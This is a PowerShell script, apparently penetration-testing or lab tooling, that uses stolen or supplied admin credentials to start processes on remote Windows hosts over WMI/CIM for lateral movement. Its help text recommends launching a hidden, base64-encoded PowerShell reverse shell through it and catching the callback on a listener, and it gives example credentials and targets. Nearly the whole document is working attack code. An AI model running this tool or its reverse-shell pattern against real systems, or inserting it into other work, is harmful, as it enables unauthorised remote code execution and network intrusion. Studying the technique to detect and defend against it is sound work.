<#
.SYNOPSIS
    Spawn a process on a remote Windows host over WMI using a CIM session.
    Living-off-the-land lateral movement — native PowerShell, no impacket.

.DESCRIPTION
    Builds a credential object, opens a CIM session to the target (DCOM by
    default, WinRM optional), and calls Win32_Process.Create to run a command
    on the remote host in the supplied user's context.

    IMPORTANT — run this FROM A WINDOWS FOOTHOLD, not from Kali.
    DCOM is a Windows-only transport; pwsh on Linux cannot use -Protocol DCOM.
    From Kali, use:  impacket-wmiexec domain/user:'pass'@<target>

    Win32_Process.Create is fire-and-forget: it returns a ProcessId and a
    ReturnValue, NOT the command's output. Pair it with a reverse shell and
    catch the callback on your listener — do not expect output here.

.PARAMETER Target
    Remote host IP or hostname. The supplied user must be local admin on it.

.PARAMETER Username
    User to authenticate as. DOMAIN\user or user (resolved against target domain).

.PARAMETER Password
    Cleartext password for Username.

.PARAMETER Command
    Command line to run on the target. Typically:
      powershell -nop -w hidden -e <BASE64_UTF16LE_REVSHELL>

.PARAMETER Protocol
    DCOM (default, port 135 — use when WinRM/5985 is filtered) or Wsman (WinRM).

.EXAMPLE
    .\invoke_cmd.ps1 -Target 192.168.50.73 -Username jen -Password 'Nexus123!' `
        -Command 'powershell -nop -w hidden -e JABjAGwAaQBl...'

.EXAMPLE
    # Force WinRM transport instead of DCOM
    .\invoke_cmd.ps1 -Target dc1 -Username admin -Password 'P@ss' -Command 'calc.exe' -Protocol Wsman
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)] [string] $Target,
    [Parameter(Mandatory = $true)] [string] $Username,
    [Parameter(Mandatory = $true)] [string] $Password,
    [Parameter(Mandatory = $true)] [string] $Command,
    [ValidateSet('DCOM', 'Wsman')] [string] $Protocol = 'DCOM'
)

# Win32_Process.Create return codes — decode the common ones so a non-zero
# result tells you WHY rather than leaving you guessing.
$ReturnCodes = @{
    0  = 'Success — process spawned'
    2  = 'Access denied (creds are not admin on the target?)'
    3  = 'Insufficient privilege'
    8  = 'Unknown failure'
    9  = 'Path not found'
    21 = 'Invalid parameter'
}

$Session = $null
try {
    Write-Host "[*] Building credential object for $Username..." -ForegroundColor Cyan
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

    Write-Host "[*] Creating CIM session option ($Protocol)..." -ForegroundColor Cyan
    $Options = New-CimSessionOption -Protocol $Protocol

    Write-Host "[*] Connecting to $Target..." -ForegroundColor Cyan
    $Session = New-CimSession -ComputerName $Target -Credential $Credential -SessionOption $Options -ErrorAction Stop
    Write-Host "[+] CIM session established." -ForegroundColor Green

    Write-Host "[*] Invoking Win32_Process.Create..." -ForegroundColor Cyan
    $Result = Invoke-CimMethod `
        -CimSession $Session `
        -ClassName Win32_Process `
        -MethodName Create `
        -Arguments @{ CommandLine = $Command } `
        -ErrorAction Stop

    $rv = [int]$Result.ReturnValue
    $meaning = if ($ReturnCodes.ContainsKey($rv)) { $ReturnCodes[$rv] } else { 'Undocumented code' }

    if ($rv -eq 0) {
        Write-Host "[+] Process spawned. PID: $($Result.ProcessId)" -ForegroundColor Green
        Write-Host "[!] NOTE: output does NOT return here — check your listener for the shell." -ForegroundColor Yellow
    }
    else {
        Write-Host "[!] Create returned $rv — $meaning" -ForegroundColor Red
        Write-Host "[!] No process was spawned." -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($Session) {
        Remove-CimSession -CimSession $Session
        Write-Host "[*] CIM session closed." -ForegroundColor DarkGray
    }
}
